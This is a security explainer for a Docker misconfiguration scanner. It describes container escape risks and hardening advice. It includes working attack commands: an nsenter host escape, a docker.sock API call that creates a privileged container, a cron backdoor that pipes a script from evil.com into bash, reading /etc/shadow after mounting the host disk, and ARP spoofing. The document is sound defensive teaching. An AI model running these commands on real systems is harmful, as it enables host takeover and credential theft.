# Security Concepts Explained

This document explains the security risks that DockerScope detects, in plain language. It assumes you know what Docker is and how containers work, but not the Linux internals that make these attacks possible.

---

## 1. Why `--privileged` is effectively root on the host

When you run a container with `--privileged`, Docker removes almost all isolation between the container and the host. The container gets:

- Access to **all host devices** (`/dev/sda`, `/dev/mem`, etc.)
- **All Linux capabilities** (the full set, not just the default subset)
- The ability to **mount filesystems**, including the host's root filesystem
- No **seccomp** or **AppArmor** restrictions

### The escape

An attacker inside a privileged container can become root on the host in one command:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**What this does:** `nsenter` enters the namespaces of process ID 1 (the host's init process). The flags (`--mount`, `--uts`, `--ipc`, `--net`, `--pid`) tell it to join all namespace types. The result is a shell running in the host's full context — not inside any container. You are now root on the host.

This works because a privileged container can see host processes (PID namespace is shared or accessible) and has the `CAP_SYS_ADMIN` capability needed to enter other namespaces.

### Why people use it

Some software legitimately needs privileged mode — for example, tools that manage hardware or need access to the kernel's control groups. But in most self-hosted setups, `privileged: true` is used because a blog post said to add it, not because the software actually needs it.

### What to do instead

Remove `--privileged` and grant only the specific capabilities the container needs:

```yaml
# Instead of: privileged: true
cap_add:
  - NET_ADMIN  # Only if actually needed
```

---

## 2. Why docker.sock is a full root backdoor

The Docker socket (`/var/run/docker.sock`) is the Unix socket that the Docker CLI uses to talk to the Docker daemon. If a container has this socket mounted, it can do everything `docker` commands can do — including creating new containers.

### The attack

From inside a container with the socket mounted:

```bash
# Install curl (or use any HTTP client)
apk add curl

# Create a new privileged container that mounts the host root filesystem
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["chroot", "/host", "sh"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }' \
  http://localhost/containers/create

# Start the container (use the ID from the response)
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/<ID>/start
```

This creates a new container that:
1. Mounts the entire host filesystem at `/host`
2. Runs in privileged mode
3. Uses `chroot` to make the host filesystem the root

The attacker now has a root shell on the host. The entire process takes about 10 seconds.

### Why people mount it

Tools like **Portainer** (container management UI), **Watchtower** (auto-updates), and **Traefik** (reverse proxy with auto-discovery) need the Docker socket to manage or inspect containers. This is a legitimate use case, but it means these containers are high-value targets — if an attacker compromises them, they own your entire host.

### What to do

- If a container doesn't need Docker API access, **never mount the socket**
- If it does, consider using a Docker socket proxy like [Tecnativa/docker-socket-proxy](https://github.com/Tecnativa/docker-socket-proxy) that filters API calls
- Add these containers to your DockerScope whitelist so you're not numb to the warning, but keep them patched and monitored

---

## 3. What host network mode actually means

When a container uses `network_mode: host`, it shares the host's network stack directly. The container doesn't get its own network namespace — it uses the host's.

### What the container can do

- **Bind to any port** on the host, including ports below 1024 (if running as root)
- **See all network traffic** on the host's interfaces using tools like `tcpdump`
- **ARP spoof** other devices on the local network
- **Access services** bound to `127.0.0.1` on the host (databases, admin panels, etc.)
- **Scan the local network** as if it were the host itself

### Why this matters for self-hosters

If you run Home Assistant with `network_mode: host` (which is common for device discovery), and it gets compromised, the attacker can:

1. See all traffic on your home network
2. Access any service running on the host's localhost
3. Spoof ARP to intercept traffic from other devices
4. Scan and attack other devices on your LAN

### What to do instead

Use bridge networking and map only the specific ports needed:

```yaml
# Instead of: network_mode: host
ports:
  - "8123:8123"  # Only expose the web UI port
```

If the container needs multicast or mDNS for device discovery, consider using `network_mode: host` but understand the risk and harden the container in other ways (non-root user, read-only filesystem, dropped capabilities).

---

## 4. What a shared volume attack looks like

When two containers mount the same host directory, they can read and write each other's files. This creates a lateral movement path: compromising container A gives you access to container B's data (and potentially code execution in B).

### Concrete example: cron job injection

Suppose you have this setup:

```yaml
services:
  webapp:
    image: myapp:latest
    volumes:
      - /etc:/host-etc  # Mounted for reading config files

  monitoring:
    image: grafana:latest
    volumes:
      - /etc:/host-etc:ro  # Same mount, read-only
```

An attacker who compromises `webapp` can:

1. Write a cron job to the host's `/etc/cron.d/` (via the mounted `/host-etc/cron.d/`):

```bash
echo '* * * * * root curl http://evil.com/shell.sh | bash' > /host-etc/cron.d/backdoor
```

2. The host's cron daemon picks up this file and runs the command as root every minute
3. The attacker now has a persistent root shell on the host

### Less obvious cases

Even if the shared volume isn't `/etc`, shared data directories can enable:
- **Data exfiltration** — container A reads container B's database files
- **Code injection** — container A writes malicious code to a directory that container B serves or executes
- **Configuration tampering** — container A modifies config files that container B reads on restart

### What to do

- Mount volumes as **read-only** (`:ro`) whenever possible
- Avoid mounting sensitive host paths (`/etc`, `/root`, `/var/lib/docker`)
- Use named volumes instead of host bind mounts when containers just need to share data between themselves

---

## 5. Capabilities explained simply

Linux capabilities are a way to split up the powers of the root user into smaller pieces. Instead of giving a process all-or-nothing root access, you can grant specific capabilities. Docker drops most capabilities by default, but compose files can add them back.

### CAP_SYS_ADMIN — "Almost root"

This is the most dangerous capability. Despite the name suggesting it's about "system administration," it actually grants an extremely wide set of powers:

- **Mount and unmount filesystems** — an attacker can mount the host's disk inside the container
- **Use `pivot_root`** — change the root filesystem
- **Create and configure namespaces** — potentially escape container isolation
- **Modify kernel parameters** via `/proc/sys`

**Exploit example:** An attacker with SYS_ADMIN can mount the host's block device and read/write any file:

```bash
mkdir /host-root
mount /dev/sda1 /host-root
cat /host-root/etc/shadow  # Read password hashes
```

### CAP_NET_ADMIN — Network control

This capability lets the container:

- **Modify firewall rules** (iptables/nftables)
- **Configure network interfaces** — create, delete, or modify
- **ARP spoofing** — redirect traffic from other devices on the network
- **Modify routing tables** — redirect traffic to attacker-controlled endpoints

**Exploit example:** ARP spoof the default gateway to intercept all LAN traffic:

```bash
# Pretend to be the router (192.168.1.1) to all devices
arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1
```

### CAP_SYS_PTRACE — Process debugging

This lets the container:

- **Attach to any process** in the same PID namespace using `ptrace`
- **Read and write process memory** — inject code, steal credentials
- **Read `/proc/[pid]/` filesystem** entries for other processes

**Exploit example:** If combined with host PID mode (`pid: host`), an attacker can inject a shared library into any host process:

```bash
# Inject into a running process to execute arbitrary code
nsenter --target <host-pid> --mount --pid -- /bin/bash
```

### What to do

- Never add capabilities unless you know exactly why the software needs them
- Check the documentation for the specific container to see if it lists required capabilities
- Use `cap_drop: [ALL]` and then add back only what's needed:

```yaml
cap_drop:
  - ALL
cap_add:
  - NET_BIND_SERVICE  # Only if it needs to bind ports below 1024
```
